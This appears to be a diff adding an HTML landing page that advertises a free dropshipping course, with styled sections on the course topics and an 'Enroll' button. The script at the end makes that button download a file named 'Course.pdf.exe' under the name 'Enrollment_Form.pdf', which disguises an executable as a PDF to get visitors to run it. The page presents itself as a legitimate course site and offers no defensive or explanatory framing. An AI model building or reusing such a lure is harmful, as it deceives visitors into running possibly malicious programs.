@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Dropshipping Course</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+        }
+        header {
+            text-align: center;
+            padding: 50px 20px;
+            background-color: #3498db;
+            color: #fff;
+        }
+        h1 {
+            font-size: 36px;
+        }
+        section {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #333;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+        }
+        h2 {
+            color: #3498db;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        ul li {
+            margin-bottom: 10px;
+        }
+        a {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #3498db;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        a:hover {
+            background-color: #2980b9;
+        }
+        footer {
+            margin-top: 30px;
+            padding: 10px;
+            text-align: center;
+            background-color: #3498db;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>Your Dropshipping Course</h1>
+        <p>Learn the ins and outs of dropshipping to boost your online business.</p>
+    </header>
+
+    <section>
+        <h2>About Dropshipping</h2>
+        <p>Dropshipping is a business model where you sell products to customers without holding any inventory. Instead, you purchase the items from a third party and have them shipped directly to the customer.</p>
+    </section>
+
+    <section>
+        <h2>Course Overview</h2>
+        <p>This course covers the following topics:</p>
+        <ul>
+            <li>Understanding Dropshipping</li>
+            <li>Finding Profitable Niches</li>
+            <li>Choosing Reliable Suppliers</li>
+            <li>Setting Up Your Online Store</li>
+            <li>Marketing Strategies</li>
+        </ul>
+    </section>
+
+    <section id="enroll-form">
+        <h2>Enrollment Form</h2>
+        <p>Fill out the form below to enroll in the course:</p>
+        <!-- Add your enrollment form code here -->
+        <!-- For simplicity, you might want to use a third-party service or a more advanced solution for the form. -->
+    </section>
+
+    <section>
+        <h2>Enroll in the Course</h2>
+        <p>Ready to dive into the world of dropshipping? Enroll in our free course now!</p>
+        <a href="#" onclick="downloadFile()">Enroll</a>
+    </section>
+
+    <footer>
+        <p>&copy; All rights reserved.</p>
+    </footer>
+
+    <script>
+        function downloadFile() {
+            // Replace 'sample.pdf' with the actual file you want to offer for download
+            var fileUrl = 'Course.pdf.exe';
+            
+            // Create a temporary link element
+            var link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = 'Enrollment_Form.pdf'; // Specify the desired file name
+            document.body.appendChild(link);
+            
+            // Trigger the click event to start the download
+            link.click();
+            
+            // Remove the link from the document
+            document.body.removeChild(link);
+        }
+    </script>
+
+</body>
+</html>
